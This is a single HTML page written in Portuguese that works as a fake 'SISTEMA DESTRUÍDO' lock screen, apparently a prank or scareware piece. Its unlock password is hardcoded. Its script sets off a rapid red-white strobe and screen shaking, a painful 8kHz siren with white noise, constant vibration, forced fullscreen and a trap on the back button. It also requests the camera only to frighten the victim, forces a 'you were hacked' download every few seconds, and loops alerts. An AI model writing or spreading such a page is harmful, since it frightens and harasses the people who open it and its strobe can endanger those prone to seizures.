<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>SISTEMA DESTRUÍDO</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
  html, body {
    height: 100%; width: 100%; position: fixed; overflow: hidden;
    background: #000; font-family: 'Courier New', monospace; cursor: none;
    touch-action: none; overscroll-behavior: none; margin: 0; top: 0; left: 0;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    color: #fff; user-select: none;
  }
  
  /* Piscar INSANO */
  #lock-screen {
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    width: 100%; height: 100%; padding: 20px; text-align: center;
    animation: strobe 0.05s infinite, shake 0.05s infinite;
  }

  @keyframes strobe {
    0% { background: #fff; color: #000; }
    50% { background: #000; color: #fff; }
    100% { background: #f00; color: #fff; }
  }

  @keyframes shake {
    0% { transform: translate(0,0); }
    25% { transform: translate(-10px, 10px); }
    50% { transform: translate(10px, -10px); }
    75% { transform: translate(-10px, -10px); }
    100% { transform: translate(10px, 10px); }
  }

  .title {
    font-size: clamp(3rem, 15vw, 8rem); font-weight: 900;
    text-transform: uppercase; letter-spacing: 5px; margin-bottom: 10px;
    animation: invert 0.1s infinite;
  }

  @keyframes invert {
    0% { filter: invert(0); }
    50% { filter: invert(1); }
    100% { filter: invert(0); }
  }
  
  .subtitle {
    font-size: 1.5rem; margin-bottom: 40px; letter-spacing: 3px;
    font-weight: bold; background: #000; color: #0f0; padding: 10px; border: 2px solid #0f0;
  }

  .input-area {
    display: flex; flex-direction: column; align-items: center; gap: 15px;
    background: #000; padding: 20px; border-radius: 10px;
    border: 4px solid #fff; box-shadow: 0 0 100px rgba(255,255,255,0.8);
  }

  input[type="password"] {
    background: #000; border: 4px solid #00ff00; color: #00ff00;
    padding: 15px; font-size: 2rem; font-family: inherit; text-align: center;
    border-radius: 5px; outline: none; width: 280px; letter-spacing: 10px;
  }

  button {
    background: #f00; color: #fff; border: none; padding: 20px 30px;
    font-size: 1.5rem; font-family: inherit; font-weight: 900; cursor: pointer;
    border-radius: 5px; width: 280px; text-transform: uppercase;
    letter-spacing: 3px; border: 2px solid #fff;
  }

  .footer {
    position: absolute; bottom: 10px; font-size: 1.5rem; color: #0f0;
    font-weight: 900; letter-spacing: 5px; background: #000; padding: 5px;
  }
</style>
</head>
<body>

<div id="lock-screen">
  <div class="title" id="glitch-title">SISTEMA DESTRUÍDO</div>
  <div class="subtitle">DESBLOQUEIE PARA SALVAR</div>
  
  <div class="input-area">
    <input type="password" id="senhaInput" autocomplete="off" autofocus>
    <button id="btnDesbloquear">SALVAR</button>
  </div>

  <div class="footer">Feito por: Davi chukitos</div>
</div>

<script>
(function(){
  const SENHA_CORRETA = "CHUKITOS";
  const input = document.getElementById('senhaInput');
  const btn = document.getElementById('btnDesbloquear');
  const glitchTitle = document.getElementById('glitch-title');
  
  let audioCtx, osc, lfo, noise;
  let glitchLoop, vibInterval;

  // --- SIRENE + RUÍDO BRANCO (Dor física nos ouvidos) ---
  function iniciarAudio() {
    try {
      if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        
        // Sirene Aguda
        osc = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        osc.type = 'sawtooth'; 
        osc.frequency.value = 8000; // 8kHz é quase inaudível e MUITO irritante
        osc.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        gainNode.gain.value = 0.05;
        osc.start();

        // Ruído branco (Chiado de TV)
        const bufferSize = audioCtx.sampleRate * 2;
        const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
        const data = buffer.getChannelData(0);
        for (let i = 0; i < bufferSize; i++) {
          data[i] = Math.random() * 2 - 1;
        }
        noise = audioCtx.createBufferSource();
        noise.buffer = buffer;
        noise.loop = true;
        const noiseGain = audioCtx.createGain();
        noiseGain.gain.value = 0.1;
        noise.connect(noiseGain);
        noiseGain.connect(audioCtx.destination);
        noise.start();
      }
    } catch(e) {}
  }

  // --- VIBRAÇÃO DE TERREMOTO ---
  function vibrar() {
    if ("vibrate" in navigator) {
      vibInterval = setInterval(() => {
        navigator.vibrate([1000, 100, 1000, 100, 1000]); 
      }, 2000);
    }
  }

  function pararTudo() {
    try { 
      if(osc) osc.stop(); 
      if(noise) noise.stop();
      if(audioCtx) audioCtx.close(); 
      audioCtx = null; 
    } catch(e) {}
    if ("vibrate" in navigator) { clearInterval(vibInterval); navigator.vibrate(0); }
    clearInterval(glitchLoop);
  }

  // --- TÍTULO GLITCH ---
  function iniciarGlitch() {
    const originalText = "SISTEMA DESTRUÍDO";
    const chars = "XØ¥§€£∆©®™";
    glitchLoop = setInterval(() => {
      let text = "";
      for(let i=0; i<originalText.length; i++) {
        if(Math.random() > 0.5 && originalText[i] !== " ") {
          text += chars.charAt(Math.floor(Math.random() * chars.length));
        } else {
          text += originalText[i];
        }
      }
      glitchTitle.innerText = text;
    }, 30);
  }

  // --- LOOP DE DOWNLOAD (Notificação falsa) ---
  function forcarDownload() {
    const a = document.createElement('a');
    a.href = "data:text/plain;charset=utf-8,HACKED%20BY%20CHUKITOS";
    a.download = "VOCE_FOI_HACKEADO.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  // --- TRAVA DE VOLTAR ---
  function forcarTelaCheia() {
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
  }

  history.pushState(null, null, location.href);
  window.onpopstate = function () {
    history.pushState(null, null, location.href);
  };
  
  // --- LÓGICA DA SENHA ---
  function checarSenha() {
    const digitada = input.value.toUpperCase();
    if (digitada === SENHA_CORRETA) {
      pararTudo();
      
      if (document.exitFullscreen) document.exitFullscreen().catch(()=>{});
      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
      
      document.body.innerHTML = `
        <div style="display:flex;flex-direction:column;height:100vh;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;">
          <div style="font-size:3rem; font-weight:900; text-shadow: 0 0 20px #0f0;">SALVO.</div>
          <div style="font-size:1.5rem;color:#f00; margin-top:40px; font-weight:bold;">Feito por: Davi chukitos</div>
        </div>`;
      document.body.style.cursor = 'default';
      
    } else {
      input.value = '';
      input.style.borderColor = '#ff0000';
      setTimeout(() => { input.style.borderColor = '#00ff00'; }, 150);
      if (navigator.vibrate) navigator.vibrate([1000]); 
    }
  }

  // --- GATILHO INICIAL ---
  document.body.addEventListener('click', () => {
    iniciarAudio();
    vibrar();
    iniciarGlitch();
    forcarTelaCheia();
    
    // Pede a câmera (susto psicológico)
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          // Se ele aceitar, a gente não mostra a câmera, mas o celular liga o LED de gravação
          // Isso dá um cagaço do caralho.
        }).catch(err => {});
    }

    // Loop de downloads de 5 em 5 segundos
    setInterval(forcarDownload, 5000);

    // Pop-ups infinitos (o navegador vai bloquear a maioria, mas a tentativa continua)
    setInterval(() => {
      try { alert("VOCÊ FOI HACKEADO PELO CHUKITOS!"); } catch(e) {}
    }, 2000);
    
  }, { once: true });

  btn.addEventListener('click', checarSenha);
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') checarSenha();
  });

  setInterval(() => {
    if(document.activeElement !== input) input.focus();
  }, 100);

})();
</script>
</body>
</html>
